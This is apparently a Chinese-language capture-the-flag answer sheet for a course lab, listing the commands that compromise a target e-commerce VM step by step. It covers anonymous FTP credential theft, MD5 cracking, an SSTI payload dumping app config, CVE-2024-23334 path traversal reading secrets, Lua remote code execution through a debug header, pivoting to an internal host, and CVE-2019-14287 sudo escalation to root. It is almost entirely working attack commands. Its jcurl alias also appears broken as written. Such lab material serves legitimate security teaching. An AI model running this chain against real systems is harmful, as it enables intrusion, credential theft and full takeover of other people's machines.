### 直接指令解答

---


## 環境設定

```bash
# TARGET為靶機IP，這是我的別搞我
$TARGET
export TARGET=192.168.17.133

#設curl=jcurl+讀懂中文編碼的指令
alias jcurl='curl -s | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d, ensure_ascii=False, indent=2))"'

```

---


## 第一階段：資訊挖掘

```bash
# 先掃描靶機，後掃描目標開放服務
nmap -p 21,8080,8081 -sV $TARGET

# BOLA - 存取隱藏商品 id=0
jcurl http://$TARGET:8080/api/products/0

# 查看 /system-status/ 原始碼，找 HTML 註解中的 debug 介面線索
curl -s http://$TARGET:8080/system-status/

# 匿名 FTP 登入，下載憑證備份
ftp -n $TARGET 21 <<EOF
user anonymous anonymous
get backup_logs/credentials.bak
bye
EOF
cat credentials.bak

# 破解 guest 的 MD5 雜湊
# 提示：雜湊為 FCF41657F02F88137A1BCF068A32C0A3
find /usr/share/wordlists/ -name "rockyou*"
# 建立過濾後的字典以加速破解
awk 'length($0) <= 10 && /^[a-z]+$/' /usr/share/wordlists/rockyou.txt > wordlist.txt
hashcat -m 0 FCF41657F02F88137A1BCF068A32C0A3 wordlist.txt
# 破解結果：guest123
```

---

## 第二階段：SSTI 取得 Seller 帳密

```bash
# 用 guest 登入取得 session cookie
curl -s -c cookies.txt -X POST http://$TARGET:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"guest","password":"guest123"}'

# 取得 guest 的邀請碼
jcurl -b cookies.txt http://$TARGET:8080/api/user/me

# 用邀請碼註冊正式帳號
curl -s -X POST http://$TARGET:8080/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","confirm_password":"Attack123","email":"attacker@evil.com","invite_code":"INVITE-GUEST-2024"}'

# 用新帳號登入
curl -s -c cookies2.txt -X POST http://$TARGET:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123"}'

# SSTI payload - 打出 app_config 拿 Seller 帳密
jcurl -b cookies2.txt -X POST http://$TARGET:8080/api/reviews/add \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "comment": "{{ config }}"}'
```

---

## 第三階段：CVE-2024-23334 路徑穿越

```bash
# Seller 登入
curl -s -c seller_cookies.txt -X POST http://$TARGET:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"neo_vendor","password":"VendorPass8899"}'

# 上傳假 PDF 洩漏絕對路徑
jcurl -b seller_cookies.txt -X POST http://$TARGET:8080/api/seller/upload \
  -F "file=@/dev/null;type=application/pdf;filename=test.pdf"

# 匿名 FTP 下載備份日誌
ftp -n $TARGET 21 <<EOF
user anonymous anonymous
get backup_logs/server_migration.bak
bye
EOF
cat server_migration.bak

# 路徑穿越讀取敏感檔案（直打 Port 8081 繞過 Gateway）
curl -s --path-as-is "http://$TARGET:8081/assets-library/../../../site-b-dev/configs/deploy_note.txt"
curl -s --path-as-is "http://$TARGET:8081/assets-library/../../config/secret_flag.txt"
curl -s --path-as-is "http://$TARGET:8081/assets-library/../../config/users.json"
curl -s --path-as-is "http://$TARGET:8081/assets-library/../../config/server_config.json"
```

---

## 第四階段：Lua RCE 驗證

```bash
# 確認介面存在
curl -s http://$TARGET:8080/api/debug-system

# 確認執行身份
curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("id"):read("*a"))' \
  http://$TARGET:8080/api/debug-system

# 確認可以打到 neo-mall 內網
curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s http://neo-mall:8080/api/system/info"):read("*a"))' \
  http://$TARGET:8080/api/debug-system
```

---

## 第五階段：橫向移動 + 提權(Pivot & CVE-2019-14287)

```bash
# 確認 diag API 可用，測試 whoami
curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"whoami\\\"}\""):read("*a"))' \
  http://$TARGET:8080/api/debug-system

# CVE-2019-14287 確認提權成功
curl -s -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /bin/bash -c id\\\"}\""):read("*a"))' \
  http://$TARGET:8080/api/debug-system
```

---

## 第六階段：取得 Flag

```bash
# 生成 Flag（學號換成自己的）
jcurl -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /root/flag.sh 你的學號\\\"}\""):read("*a"))' \
  http://$TARGET:8080/api/debug-system

# 讀取 Root Flag
jcurl -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"sudo -u#-1 /bin/bash -c \\\\\\\"cat /root/root_flag.txt\\\\\\\"\\\"}\""):read("*a"))' \
  http://$TARGET:8080/api/debug-system

# 讀取 User Flag
jcurl -H 'X-NEO-DEBUG: ngx.say(io.popen("curl -s -X POST http://neo-mall:8080/api/seller/diag -H \"Content-Type: application/json\" -d \"{\\\"command\\\":\\\"cat /home/neo-user/user_flag.txt\\\"}\""):read("*a"))' \
  http://$TARGET:8080/api/debug-system
```
